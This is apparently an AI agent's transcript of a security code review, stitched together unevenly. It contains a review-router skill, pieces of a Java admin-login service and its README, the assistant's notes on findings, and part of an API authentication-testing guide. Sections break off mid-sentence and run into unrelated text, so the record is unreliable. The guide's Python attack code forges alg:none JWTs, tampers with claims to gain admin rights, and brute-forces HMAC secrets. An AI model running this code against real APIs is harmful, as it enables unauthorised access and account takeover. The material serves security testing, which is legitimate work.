On its own it holds no vulnerability rules; its job is\nto understand the code under review, pull in the most relevant specialised\nskills from this same library, and apply them. This library contains hundreds\nof specialised skills (cryptographic audit, SQL injection, JWT verification,\nsecrets in source, deserialization, access control, and many more) whose\nindividual descriptions are often too narrow to self-trigger on a plain \"review\nthis code\" request. This skill is the entry point that finds and uses them.\n\n## When to Use\n\n- Any request to review, audit, or security-check source code\n- Any request to find vulnerabilities or check code against OWASP Top 10 / CWE\n- As the first step before the library's specialised application-security skills\n\n## Workflow\n\n### Step 1 - Understand the code\nRead every source file in scope. For each file, note in one or two lines what it\ndoes, and flag every security-relevant behaviour, e.g.:\n- SQL / database query construction (string building vs parameterised)\n- Cryptography: hashing, encryption, cipher mode, key/IV/salt handling, RNG\n- Authentication, sessions, password storage, tokens / JWT\n- Input handling, deserialization, file/path access, OS command execution\n- Network calls, TLS settings, secrets / credentials in source\nTurn these into a short list of keywords (e.g. \"sql injection\", \"cryptography\",\n\"jwt\", \"hardcoded secret\", \"deserialization\", \"xss\").\n\n### Step 2 - Find applicable skills (cheaply)\nThe other skills in this library are the sibling directories next to this\nskill's own directory. Do NOT read them all. Instead:\n1. Find this skill's directory, then its parent (the library root).\n2. Grep skill NAMES first for your Step 1 keywords, e.g. from the library root:\n   `ls | grep -iE 'crypto|sql|jwt|secret|deserial|xss|auth|password'`\n3. For the closest name matches, read ONLY the `description` frontmatter of\n   their SKILL.md (`sed -n '1,15p' <name>/SKILL.md`).\n\nSelect EVERY skill whose description clearly matches a security-relevant\nbehaviour you found in Step 1 - one or more per behaviour. Do NOT cap the count\nartificially: code that touches several concerns should match several skills,\nand that is expected. Order the selected skills by likely severity / relevance\nso the most important are handled first.\n\n### Step 3 - Apply each selected skill\nWork through the selected skills in priority order. Read each skill's body (and\nits `references/` files if present) only when you reach it - one at a time, not\nall up front - so that a long list of matches never exhausts context. Apply each\nskill's weakness table / checklist / verification criteria against the actual\ncode from Step 1, citing concrete `file:line` evidence for every check that\nfires. Some skills ship Python helper scripts - apply their *knowledge* to\nwhatever language the code is in; do not run their scripts against non-Python\ncode.\n\n### Step 4 - Report\nProduce a findings report:\n- One entry per issue: severity, CWE id, `file:line`, why it is a problem, and\n  the fix.\n- A \"Skills applied\" list naming the specialised skills you used.\n- For any security-relevant behaviour that had no matching library skill, review\n  it against general OWASP Top 10 / CWE knowledge and say you did so.\n- If nothing is wrong, say so explicitly and list what you checked.\n\n## Constraints\n\n- Report only. Do not create or modify any files unless explicitly asked.\n- Keep the library search cheap: grep names, skim descriptions, and fully read\n  skill bodies only as you apply them, one at a time. Never load the whole\n  library into context at once.\n\n## Verification\n\n- Every security-relevant behaviour from Step 1 is either matched to a skill and\n  checked, or explicitly reviewed against general knowledge.\n- Every finding carries a CWE id and a `file:line`.\n- The \"Skills applied\" list is present.\n"}]}},{"type":"user","uuid":"50265d37-5645-48bd-90d1-e97390dd084c","session_id":"67ebb3f4-fd3a-4f12-95d0-32d1c299e719","parent_tool_use_id":null,"message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"call_d9caaf846430451ba2a4dacf","is_error":false,"content":"Found 44 matching file(s)"}]}},{"type":"assistant","uuid":"05b8e834-ed56-40e4-9d0f-5fbcf018eb70","session_id":"67ebb3f4-fd3a-4f12-95d0-32d1c299e719","parent_tool_use_id":null,"message":{"id":"05b8e834-ed56-40e4-9d0f-5fbcf018eb70","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"The skill is a router skill. adminportal;\n\nimport java.io.IOException;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.nio.file.Path;\n\n/**\n * Credential verification for administrator accounts, with brute-force resistance and mandatory\n * audit recording.\n *\n * Design decisions that matter for security review:\n * <ul>\n *   <li><b>Equal work for unknown users.</b> A non-existent username still costs one PBKDF2 run\n *       against a fixed dummy digest, so response time does not disclose whether an account exists.</li>\n *   <li><b>Generic errors.</b> Callers receive {@link Result#message()} only; the reason (unknown\n *       account vs. wrong password vs. disabled) is written to the audit log, never shown to the\n *       person logging in.</li>\n *   <li><b>Fail closed on audit failure.</b> If a record cannot be persisted, authentication is\n *       refused. An unlogged success is worse than a refused login.</li>\n *   <li><b>Per-account lockout plus global throttle.</b> Repeated failures against an account lock\n *       it for a cooling-off period; failures across all accounts trip a shared backoff so lockout\n *       cannot be used as a free denial-of-service shield while an attacker sprays other accounts.</li>\n * </ul>\n */\npublic final class AuthenticationService {\n\n    public static final int MAX_ATTEMPTS_PER_ACCOUNT = 5;\n    public static final Duration LOCKOUT_DURATION = Duration.ofMinutes(10);\n    public static final int GLOBAL_FAILURE_THRESHOLD = 20;\n    public static final Duration GLOBAL_BACKOFF = Duration.ofSeconds(30);\n    public static final int MAX_PASSWORD_LENGTH = 256;\n\n    public enum Reason {\n        SUCCESS,\n        UNKNOWN_ACCOUNT,\n        BAD_PASSWORD,\n        ACCOUNT_DISABLED,\n        ACCOUNT_LOCKED,\n        THROTTLED,\n        BAD_INPUT,\n        AUDIT_FAILURE,\n        PERSISTENCE_FAILURE\n    }\n\n    /** Outcome of one authentication attempt. {@link #message()} is safe to display verbatim. */\n    public record Result(boolean granted, Reason reason, String username, String message,\n                        long sequence, long retryAfterSeconds) {\n        static final String GENERIC_FAILURE = \"Access denied.\";\n        static final String THROTTLED_MESSAGE = \"Too many failed attempts. (may be null)\n     */\n    public Result authenticate(String username, char[] password, String actor) {\n        String requested = username == null ? \"\" : username;\n        String safeActor = actor == null ? \"cli\" : actor;\n        String claimedKey = AdminUserStore.lower(requested);\n\n        if (requested.isEmpty() || requested.length() > 64) {\n            return refuse(requested, safeActor, Reason.BAD_INPUT,\n                    \"username contains characters outside the allowed set\", 0);\n        }\n        if (password == null || password.length == 0) {\n            return Administrator Portal (Java 17)\n\nAuthenticates administrators, gates admin functionality behind a successful login, and records\n**every** authentication attempt -- granted or denied -- in a reviewable, tamper-evident trail.\n\nPure JDK 17. No build tool, no dependencies, no network.\n\n```\n./build.sh test          # compile + run the verification suite (215 expectations)\n./build.sh all           # ... plus the mutation battery (15 deliberate breakages)\nbash demo.sh             # scripted end-to-end walkthrough\n```\n\n## Quick start\n\n```bash\n./build.sh\n\n# First run: bootstrap the only administrator that can be created unauthenticated.\njava -cp build adminportal.AdminPortal add-user alice\n#   password for alice:            <- read with echo disabled (Console.readPassword)\n\n# Sign in and reach the admin console.\njava -cp build adminportal.AdminPortal login --user alice\n\n# Review what has been recorded.\njava -cp build adminportal.AdminPortal audit --user alice --summary\njava -cp build adminportal.AdminPortal audit --user alice --failures-only --format json\n\n# Prove the trail has not been edited.\njava -cp build adminportal.AdminPortal verify-log\n```\n\nData lives in `~/.admin-portal` (override with `--home DIR` or `$ADMIN_PORTAL_HOME`). Note that\n`user.home` is resolved from the passwd database on this platform, so `HOME=...` alone will **not**\nrelocate it -- pass `--home`.\n\n| File | Contents | Mode |\n|---|---|---|\n| `administrators.dat` | `username\\|state\\|pbkdf2$iters$salt$hash` | `0600` |\n| `audit-log.jsonl` | one JSON audit record per line | `0600` |\n| `audit-log.key` | HMAC-SHA256 trail signing key | `0600` |\n| `lockout-state.dat` | failed-attempt counters and lockout deadlines | `0600` |\n\n## Commands\n\n`login`, `audit`, `verify-log`, `add-user`, `set-password`, `enable`, `disable`, `unlock`,\n`accounts`. `--help` lists every flag.\n\nExit codes: **0** granted/completed, **1** access denied or tampering detected, **2** usage error.\n\nTrust model:\n\n- `add-user` is unauthenticated **only** while the store is empty (first-run bootstrap). Once one\n  administrator exists, provisioning requires a valid login, and the record names who authorised it.\n- `audit` is admin functionality: reviewing the trail requires a login and is itself recorded.\n- `verify-log` only recomputes integrity seals and reveals no account data, so an operator or SIEM\n  may run it unauthenticated.\n\n## How the requirements are met\n\n### Credentials are never recoverable\n\n`PasswordHasher` uses PBKDF2-HMAC-SHA256, 16-byte random salt per password, 310,000 iterations\n(OWASP 2023 guidance), 256-bit key. Verification uses `MessageDigest.isEqual`, so comparing digests\ndoes not short-circuit on a shared prefix.\n\nThe cost parameter is stored inside the digest, so an old low-cost digest still verifies and is\n**transparently re-derived** at the current cost on the next successful login (`password.rehash`).\n`--iterations` below 1,000 is refused at construction rather than silently accepted.\n\nPasswords travel as `char[]` and are zeroed in a `finally` by every caller. `PBEKeySpec` defensively\ncopies its input and clears that copy only at GC -- a JDK limitation, noted in the source rather\nthan papered over.\n\n### Every attempt is recorded, and reviewable\n\n`AuditLog.append` writes one JSON record per line:\n\n```json\n{\"seq\":\"2\",\"ts\":\"2026-09-05T10:38:48.75Z\",\"event\":\"auth.login\",\"outcome\":\"FAILURE\",\"actor\":\"cli\",\n \"username\":\"alice\",\"detail\":\"BAD_PASSWORD: password mismatch after 1 consecutive failure(s)\",\n \"prev\":\"MBbASnj...\",\"key\":\"audit-log\",\"hash\":\"2_kUZ5O...\"}\n```\n\n`audit` filters by `--username`, `--event`, `--outcome`/`--failures-only`, `--limit`, renders a\ntable or JSON (`--format json` for a SIEM), writes to a file (`--out`), and aggregates with\n`--summary` (totals, failure reasons, accounts with failures and their lockout state).\n\nIntegrity comes from a hash chain: each record's `hash` is HMAC-SHA256 over its canonical payload\n**plus** the previous record's hash, sealed with a key in a separate file. Editing, reordering, or\ndeleting any record invalidates every seal after it; `verify-log` reports the offending `seq`.\nBecause the key is a separate file, an attacker who can write the log cannot forge a valid\ncontinuation.\n\n**Two properties are enforced rather than merely intended:**\n\n- **Fail closed.** If a record cannot be written (disk full, path replaced by a directory), the\n  login is *refused*. An unlogged success is treated as worse than a denied login. The seq counter\n  advances only after `FileChannel.force(true)` returns, so no gap can be misread as a deleted\n  record.\n- **Exactly one record per attempt.** Covered by the suite, including the paths that deny before any\n  credential work happens.\n\n### Brute force is slowed, and the trail says so\n\nFive consecutive failures lock an account for 10 minutes; twenty failures across all accounts trip a\n30-second global backoff, so lockout cannot be used as a shield while an attacker sprays other\naccounts. Counters and deadlines live in `lockout-state.dat` because a CLI portal starts a **new JVM\nper login** -- in-memory counters would be wiped every attempt and lockout could be bypassed by\nre-running the command. `testLockoutSurvivesNewProcess` and the demo's five-guesses-from-five-processes\nstep both pin this.\n\n`unlock` itself requires a valid login, so a locked-out attacker cannot clear their own lockout;\nbreak-glass is a *peer* administrator.\n\n### Denials do not leak\n\nCallers always see `Access denied.` -- unknown account, wrong password, disabled account, and audit\nfailure are indistinguishable on screen. The real reason goes only to the trail, where the reviewer\nneeds it. Unknown usernames still cost one full PBKDF2 run (`PasswordHasher.dummyEncoded()`), so\nresponse time does not disclose whether an account exists; the suite asserts the known/unknown cost\nratio stays within 0.75-1.35.\n\n> This constant was written as a hard-coded base64 literal first. Java's strict decoder rejected it,\n> `verify()` bailed out early, and the unknown-user path returned in **0 ms against 156 ms** -- a\n> textbook user-enumeration oracle that the surrounding code looked correct for. It is now *derived*\n> by one real PBKDF2 run, and a test asserts the digest decodes and costs >= 3 ms, so the same class\n> of bug cannot return silently.\n\n### Log injection cannot forge a record\n\nUntrusted values (usernames, `--actor`, filter strings) pass through `AuditEvent.sanitize`: CR/LF and\ncontrol bytes neutralised, length bounded to 200. A username cannot contain the account store's `|`\nseparator, and `USERNAME_PATTERN` restricts usernames to `[A-Za-z0-9][A-Za-z0-9._@-]{0,63}`, so a\ncrafted name cannot forge an account line or a second log line. The parser additionally rejects a\nline with duplicate keys, so two records welded together cannot masquerade as one valid record.\n\n## Verification\n\n`./build.sh test` -- 215 expectations, ~11 s. Coverage: digest correctness, distinct salt per encode,\nmalformed/foreign digests rejected, corrupt store aborts load, grant/deny decisions, disabled and\nlocked accounts refuse even the *correct* password, transparent rehash, lockout, cross-process\nlockout, global backoff, chain contiguity and reopen, six tamper scenarios, fail-closed, injection,\nsession expiry/revocation, filters, CLI subprocess end-to-end, credential-leak sweep, timing parity.\n\n`python3 mutation-check.py` breaks one security property at a time in a throwaway tree and requires\nthe suite to go red. A mutation that survived would mean an uncovered property. All 15 are caught:\nplaintext storage, unsalted hashing, low iteration count, lockout disabled, lockout made\nper-process-only, unsealed trail, unlinked chain, fail-open on audit error, failures not recorded,\nreason-disclosing denials, timing oracle, unsanitized fields, world-readable store,\nlogin-on-disabled-account, unattributed admin actions.\n\n## Threat model and limits (read before deploying)\n\n- **Root can delete the trail.** The chain proves *modification*; it cannot prove the file still\n  exists. Ship records off-host (`--format json` piped to syslog/SIEM) or the guarantee ends with the\n  host.\n- **Tail truncation is undetectable.** Removing the newest records breaks no later link. The suite\n  asserts this explicitly as a known limit rather than glossing it. Detect it by comparing record\n  counts / seq against an external collector, not by running `verify-log`.\n- **Integrity is only as strong as the key.** `audit-log.key` is `0600`, which is honest for one\n  host; anything stricter belongs in a KMS or HSM. `verifyWithKeys` supports rotation, and `verify()`\n  flags a log that mixes key ids.\n- **Same-uid attacker can reset lockout** by deleting `lockout-state.dat`. Defend against guessing and\n  against casual tampering; pair with host-level rate limiting (fail2ban, ssh-guarded jump host) for\n  a determined local attacker.\n- **Local attack surface only.** No network listener exists, so TLS/CSRF do not apply. If this is ever\n  wrapped in a service, add transport security, per-principal rate limiting, and session cookies with\n  `HttpOnly`/`Secure`.\n- **Single-factor.** No MFA/TOTP. The `admin:read` / `admin:write` / `audit:read` / `user:manage`\n  privilege set is granted wholesale on success; real deployments should source it from a directory.\n- **Sessions are in-process.** A CLI command authenticates, acts, and closes its session, so tokens\n  are not reused across processes. Extending them across a long-lived service requires server-side\n  session state, which does not exist here.\n- **Clock skew.** Lockout deadlines are wall-clock seconds; NTP jumps can shorten or lengthen a\n  lockout window.\n\n## Layout\n\n```\nsrc/adminportal/\n  AdminPortal.java          CLI, command dispatch, trust model per command\n  AuthenticationService.java  auth decisions, lockout wiring, mandatory recording\n  PasswordHasher.java       PBKDF2-HMAC-SHA256, constant-time verify, rehash detection\n  AdminUserStore.java       0600 atomic account file, digest-only, strict username grammar\n  AuditLog.java             append-only JSONL, HMAC hash chain, fail-closed writes\n  AuditEvent.java           record + sanitisation + JSON encode/decode\n  AuditReviewer.java        filters, table, summary, export\n  LockoutStore.java         durable failed-attempt state\ntest/adminportal/AdminPortalTests.java   the suite\nbuild.sh  demo.sh  mutation-check.py\n```\n"}]}},{"type":"user","uuid":"6d3a6a8a-e294-4457-ae2c-3649e6ce15db","session_id":"67ebb3f4-fd3a-4f12-95d0-32d1c299e719","parent_tool_use_id":null,"message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"call_7bee2f222b5d4a58b1aca9a4","is_error":false,"content":"#!/usr/bin/env python3\n\"\"\"Mutation battery: break one security property at a time and require the suite to notice.\n\nA green test suite is only evidence if the tests can fail. Arbitrary file write via `audit --out FILE` (AdminPortal.java, around lines 302–310)**\n\nIn `review()`:\n```java\nString target = inv.opt(\"--out\");\nif (target != null) {\n    Path out = Paths.get(target).toAbsolutePath();\n    Files.createDirectories(out.getParent());\n    fileSink = new PrintStream(Files.newOutputStream(out), StandardCharsets.UTF_8);\n}\n```\n\n`--out` is authenticated (admin-only), so an authenticated admin can write to an arbitrary path. Since it's admin-only, severity is lower, but it's still a problem: the authenticated admin can overwrite arbitrary files (e.g., `--store` file, `audit-log.key`, `/etc/cron.d/...`, shell rc files) and create directories. This is a genuine \"unrestricted file upload/write\" (CWE-22/459/476… actually CWE-73 \"External Control of File Name or Path\" or CWE-459 \"Inclusion of Functionality from Untrusted Source\"… the most appropriate is: CWE-22 Path Traversal or CWE-23 Write-what-where Condition). The flag allows an authenticated admin to write the export file anywhere on the filesystem that the process user can write to. It could even overwrite `administrators.dat` or `audit-log.key`. The default is a relative path (resolved against the CWD), but absolute paths work too, and `../` is also possible.\n\nCWE-23 (Write-what-where Condition) is the best fit: \"the product writes data to a file whose location can be influenced by an untrusted source.\" Here the \"untrusted source\" is an admin, but the point is that there's no restriction/sanitization on the output path. I'll cite CWE-23 with a note, or CWE-22. Should I say CWE-22/CWE-23? Each finding needs one CWE ID. For --out, CWE-23 (Write-what-where) is most accurate. Hmm, actually CWE-22 Path Traversal fits too, since `..` traversal is a sub-case. I'll go with CWE-23 for write-what-where, and mention CWE-22 in the body.\n\n**2. Unauthenticated `add-user` bootstrap + no lockout on bootstrap (AdminPortal.java, around lines 181–207)**\n\nThe bootstrap path: if the store is empty, `add-user` runs unauthenticated. The password is read from a Console prompt or from stdin (`--pw-stdin`). Issues:\n- There's no minimum strength/length check on the bootstrap password (or any password). The password could even be empty? Let me verify: does `add-user` check for an empty password? In AdminPortal's add-user: `char[] secret = readSecret(inv, name, \"password for \" + name);` — if `--pw-stdin`, it reads the first line. If the line is empty, the password becomes an empty string. Does `AdminUserStore.create` reject empty passwords? I need to check AdminUserStore — I don't remember seeing an empty check. So an attacker who can run the first `add-user` (first-run bootstrap) can create an admin account with an empty or trivial password. This is a real issue: missing password policy/minimum strength (CWE-521 Weak Password Requirements, or CWE-798… more like CWE-521). Also, an empty password via `--pw-stdin` on stdin: reading an empty line yields an empty char[]… actually `line()` can return an empty string. Then create(name, new char[0]). Is there any check anywhere? Let me grep for a length check on the password. I recall `AuthenticationService.authenticate` had a password length check (the \"password too long\" branch: `password.length > MAX_PASSWORD`?). Let me re-verify. I need to re-read the exact code for evidence.\n\n- Bootstrap has no rate limiting: an unauthenticated attacker can run `add-user` repeatedly while the store is empty (there's no lockout). The race condition: if two processes run simultaneously while the store is empty… also, if the store file doesn't yet exist, multiple unauthenticated `add-user` invocations could race. AdminUserStore.save is synchronized, but that's per-process; two separate JVMs could both read empty, both create, and the last write wins. But this is a CLI; the threat model is local. The empty-password issue is more significant.\n\n**3. `--pw-stdin` reads the password from the first line of stdin — the password appears on the command line? No, it doesn't. But if stdin is a pipe, could the password be exposed in process memory? That's normal. Not an issue.\n\n**4. The full token is not written to the log. OK. Session TTL defaults to 15 minutes. Sessions are in-process; tokens aren't persisted. So the session token is never exposed. No issue.\n\n**5. `unlock` command: requires an admin session; clears lockout for a user.** Break-glass. Requires authentication. No issue. If any admin can clear the global throttle, that could weaken brute-force protection. Let me re-check.\n\n**6. Global throttle: 20 failures across all accounts → 30-second global backoff.** After the global backoff, in `registerFailure`, the global counter is reset (I recall \"globalTripped ... lockouts.resetGlobal()\"?). If the attacker keeps failing other accounts, the global backoff resets each time it's tripped, so the effective throttle is 30 seconds every 20 failures — that's the design.\n\nBut a subtle issue: in `registerFailure`, when the per-account lockout is tripped, is the global counter reset? Let me re-read the code.\n\n**7. `AuditLog.loadOrCreateKey` — key file is created with 0600 on POSIX, no-op on non-POSIX. I need the exact line. Also, does the store prevent usernames that collide with the GLOBAL_KEY \"@\"? GLOBAL_KEY is \"@\" in the lockout store — a username containing @ is fine in the lockout store (keys are separate namespaces: user names and \"@\").\n\nWait — actually, if USERNAME_PATTERN allows `@`, could an attacker register a username `@`? Let me re-read LockoutStore.\n\n**21. `AuthenticationService.authenticate` — order of checks: throttle first (global), then per-account lockout, then lookup+verify. Unknown user → dummyDigest to equalize timing. Then record the failure.\n\nPotential timing issue: per-account lockout check happens before the PBKDF2 cost; unknown users pay the PBKDF2 cost. Known-locked users fail early without PBKDF2 → timing distinguishes locked vs. unlocked known accounts. A locked account responds faster. Minor oracle (account existence + lockout state via timing) — the tests only assert known/unknown parity. This is a very small oracle; probably informational.\n\n**22. `registerFailure`: when the per-account counter hits MAX_ATTEMPTS_PER_ACCOUNT, a deadline is set. Let me verify the exact code.\n\n**23. `--iterations` is accepted on the command line: `--iterations 1000` is the minimum. A local attacker can pass `--iterations 1000` to weaken the cost, but… only for their own verification; verification uses the stored iteration count from the digest. `--iterations` affects new encodings (add-user/set-password) and rehashing. A local unauthenticated attacker who runs `add-user` during bootstrap could create an account with 1000 iterations (the minimum) — a weaker password hash. But the minimum of 1000 is enforced; PBKDF2 at 1000 iterations is weak (OWASP recommends 600k+ for SHA256… 310k is the default here). Accepting `--iterations` down to 1000 allows creating weak digests. This is a policy weakness: the CLI allows lowering the hash cost. Severity: low/informational. Also, an authenticated admin could use `set-password --iterations 1000` to weaken other users' hashes. Authentication testing involves attempting to bypass security controls.\n\n## Prerequisites\n\n- Written authorization specifying target API and authentication mechanisms in scope\n- Valid test credentials for at least two user roles (regular user, admin)\n- Burp Suite Professional with JWT-related extensions (JSON Web Tokens, JWT Editor)\n- Python 3.10+ with `requests`, `PyJWT`, and `jwt` libraries\n- Wordlists for credential testing (SecLists authentication wordlists)\n- API documentation or OpenAPI specification\n\n## Workflow\n\n### Step 1: Authentication Mechanism Identification\n\n```python\nimport requests\nimport json\n\nBASE_URL = \"https://target-api.example.com/api/v1\"\n\n# Probe the API to identify authentication mechanisms\nauth_indicators = {\n    \"jwt_bearer\": False,\n    \"api_key_header\": False,\n    \"api_key_query\": False,\n    \"basic_auth\": False,\n    \"oauth2\": False,\n    \"session_cookie\": False,\n    \"custom_token\": False,\n}\n\n# Test 1: Check unauthenticated access\nresp = requests.get(f\"{BASE_URL}/users/me\")\nprint(f\"Unauthenticated: {resp.status_code}\")\nif resp.status_code == 200:\n    print(\"[CRITICAL] Endpoint accessible without authentication\")\n\n# Test 2: Check WWW-Authenticate header\nif \"WWW-Authenticate\" in resp.headers:\n    scheme = resp.headers[\"WWW-Authenticate\"]\n    print(f\"Auth scheme advertised: {scheme}\")\n    if \"Bearer\" in scheme:\n        auth_indicators[\"jwt_bearer\"] = True\n    elif \"Basic\" in scheme:\n        auth_indicators[\"basic_auth\"] = True\n\n# Test 3: Login and examine tokens\nlogin_resp = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": \"testuser@example.com\", \"password\": \"TestPass123!\"})\n\nif login_resp.status_code == 200:\n    login_data = login_resp.json()\n    # Check for JWT tokens\n    for key in [\"token\", \"access_token\", \"jwt\", \"id_token\"]:\n        if key in login_data:\n            token = login_data[key]\n            if token.count('.') == 2:\n                auth_indicators[\"jwt_bearer\"] = True\n                print(f\"JWT found in response field: {key}\")\n    # Check for refresh tokens\n    for key in [\"refresh_token\", \"refresh\"]:\n        if key in login_data:\n            print(f\"Refresh token found in field: {key}\")\n    # Check for session cookies\n    for cookie in login_resp.cookies:\n        print(f\"Cookie set: {cookie.name} = {cookie.value[:20]}...\")\n        if \"session\" in cookie.name.lower():\n            auth_indicators[\"session_cookie\"] = True\n\nprint(f\"\\nAuthentication mechanisms detected: {[k for k,v in auth_indicators.items() if v]}\")\n```\n\n### Step 2: Unauthenticated Endpoint Discovery\n\n```python\n# Test all endpoints without authentication\nendpoints = [\n    (\"GET\", \"/users\"),\n    (\"GET\", \"/users/me\"),\n    (\"GET\", \"/users/1\"),\n    (\"GET\", \"/admin/users\"),\n    (\"GET\", \"/admin/settings\"),\n Analysis\n\n```python\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef decode_jwt_parts(token):\n    \"\"\"Decode JWT header and payload without verification.\"\"\"\n    parts = token.split('.')\n    if len(parts) != 3:\n        return None, None\n\n    def pad_base64(s):\n        return s + '=' * (4 - len(s) % 4)\n\n    header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])))\n    payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])))\n    return header, payload\n\n# Analyze the JWT token\ntoken = login_data.get(\"access_token\", \"\")\nheader, payload = decode_jwt_parts(token)\n\nprint(f\"JWT Header: {json.dumps(header, indent=2)}\")\nprint(f\"JWT Payload: {json.dumps(payload, indent=2)}\")\n\n# Security checks\nissues = []\n\n# Check 1: Algorithm\nif header.get(\"alg\") == \"none\":\n    issues.append(\"CRITICAL: Algorithm set to 'none' - token signature not verified\")\nif header.get(\"alg\") in (\"HS256\", \"HS384\", \"HS512\"):\n    issues.append(\"INFO: Symmetric algorithm used - check for weak/default secrets\")\n\n# Check 2: Expiration\nif \"exp\" not in payload:\n    issues.append(\"HIGH: No expiration claim (exp) - token never expires\")\nelse:\n    import time\n    exp_time = payload[\"exp\"]\n    ttl = exp_time - time.time()\n    if ttl > 86400:\n        issues.append(f\"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long\")\n\n# Check 3: Sensitive data in payload\nsensitive_fields = [\"password\", \"ssn\", \"credit_card\", \"secret\", \"private_key\"]\nfor field in sensitive_fields:\n    if field in payload:\n        issues.append(f\"HIGH: Sensitive field '{field}' in JWT payload\")\n\n# Check 4: Missing claims\nexpected_claims = [\"iss\", \"aud\", \"exp\", \"iat\", \"sub\"]\nmissing = [c for c in expected_claims if c not in payload]\nif missing:\n    issues.append(f\"MEDIUM: Missing standard claims: {missing}\")\n\n# Check 5: Key ID\nif \"kid\" in header:\n    kid = header[\"kid\"]\n    # Test for path traversal in kid\n    issues.append(f\"INFO: Key ID (kid) present: {kid} - test for injection\")\n\nfor issue in issues:\n    print(f\"  [{issue.split(':')[0]}] {issue}\")\n```\n\n### Step 4: JWT Manipulation Attacks\n\n```python\n# Attack 1: Remove signature (alg: none)\ndef forge_none_algorithm(token):\n    \"\"\"Create a token with alg:none to bypass signature verification.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    header['alg'] = 'none'\n    new_header = base64.urlsafe_b64encode(\n        json.dumps(header).encode()).decode().rstrip('=')\n    # Variations of the none algorithm\n    return [\n        f\"{new_header}.{parts[1]}.\",\n        f\"{new_header}.{parts[1]}.{parts[2]}\",\n        f\"{new_header}.{parts[1]}.e30\",\n    ]\n\n# Attack 2: Modify claims without re-signing\ndef forge_payload(token, modifications):\n    \"\"\"Modify payload claims and test if server validates signature.\"\"\"\n    parts = token.split('.')\n    payload = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))\n    payload_data.update(modifications)\n    new_payload = base64.urlsafe_b64encode(\n        json.dumps(payload_data).encode()).decode().rstrip('=')\n    return f\"{parts[0]}.{new_payload}.{parts[2]}\"\n\n# Attack 3: Brute force weak HMAC secrets\nCOMMON_JWT_SECRETS = [\n    \"secret\", \"password\", \"123456\", \"jwt_secret\", \"supersecret\",\n    \"key\", \"test\", \"admin\", \"changeme\", \"default\",\n    \"your-256-bit-secret\", \"my-secret-key\", \"jwt-secret\",\n    \"s3cr3t\", \"secret123\", \"mysecretkey\", \"apisecret\",\n]\n\ndef brute_force_jwt_secret(token):\n    \"\"\"Try common secrets against HMAC-signed JWTs.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    if header.get('alg') not in ('HS256', 'HS384', 'HS512'):\n        print(\"Not an HMAC token, skipping brute force\")\n        return None\n\n    signing_input = f\"{parts[0]}.{parts[1]}\".encode()\n    signature = parts[2]\n\n    hash_func = {\n        'HS256': hashlib.sha256,\n        'HS384': hashlib.sha384,\n        'HS512': hashlib.sha512\n    }[header['alg']]\n\n    for secret in COMMON_JWT_SECRETS:\n        expected_sig = base64.urlsafe_b64encode(\n            hmac.new(secret.encode(), signing_input, hash_func).digest()\n        ).decode().rstrip('=')\n        if expected_sig == signature:\n            print(f\"[CRITICAL] JWT secret found: '{secret}'\")\n            return secret\n\n    print(\"No common secrets matched - consider using hashcat/john for extended brute force\")\n    return None\n\n# Test all attacks\nnone_tokens = forge_none_algorithm(token)\nfor none_token in none_tokens:\n    resp = requests.get(f\"{BASE_URL}/users/me\",\n                       headers={\"Authorization\": f\"Bearer {none_token}\"})\n    if resp.status_code == 200:\n        print(f\"[CRITICAL] alg:none bypass successful\")\n\n# Test privilege escalation via claim modification\nadmin_token = forge_payload(token, {\"role\": \"admin\", \"is_admin\": True})\nresp = requests.get(f\"{BASE_URL}/admin/users\",\n                   headers={\"Authorization\": f\"Bearer {admin_token}\"})\nif resp.status_code == 200:\n    print(\"[CRITICAL] JWT claim modification accepted without signature validation\")\n\nbrute_force_jwt_secret(token)\n```\n\n### Step 5: Token Lifecycle Testing\n\n```python\n# Test 1: Token reuse after logout\nlogout_resp = requests.post(f\"{BASE_URL}/auth/logout\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nprint(f\"Logout: {logout_resp.status_code}\")\n\n# Try to use the token after logout\npost_logout_resp = requests.get(f\"{BASE_URL}/users/me\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nif post_logout_resp.status_code == 200:\n    print(\"[HIGH] Token still valid after logout - no server-side revocation\")\n\n# Test 2: Token reuse after password change\n# (requires changing password and then testing old token)\n\n# Test 3: Refresh token rotation\nrefresh_token = login_data.get(\"refresh_token\")\nif refresh_token:\n    # Use refresh token\n    refresh_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    new_tokens = refresh_resp.json()\n\n    # Try to reuse the same refresh token (should fail if rotation is implemented)\n    reuse_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    if reuse_resp.status_code == 200:\n        print(\"[HIGH] Refresh token reuse allowed - no rotation implemented\")\n\n# Test 4: Token in URL (leakage risk)\nresp = requests.get(f\"{BASE_URL}/users/me?token={token}\")\nif resp.status_code == 200:\n    print(\"[MEDIUM] Token accepted in query parameter - may leak in logs/referrer\")\n```\n\n### Step 6: Password Policy and Credential Testing\n\n```python\n# Test password policy enforcement on registration/change endpoints\nweak_passwords = [\n    \"a\",           # Too short\n    \"password\",    # Common password\n    \"12345678\",    # Numeric only\n    \"abcdefgh\",    # Alpha only, no complexity\n    \"Password1\",   # Meets basic complexity but is common\n    \"\",            # Empty\n    \" \",           # Whitespace\n]\n\nfor pwd in weak_passwords:\n    resp = requests.post(f\"{BASE_URL}/auth/register\",\n        json={\"email\": f\"test_{hash(pwd)%9999}@example.com\",\n differences\nvalid_email = \"testuser@example.com\"\ninvalid_email = \"nonexistent_user_xyz@example.com\"\n\nresp_valid = requests.post(f\"{BASE_URL}/auth/login\",\n    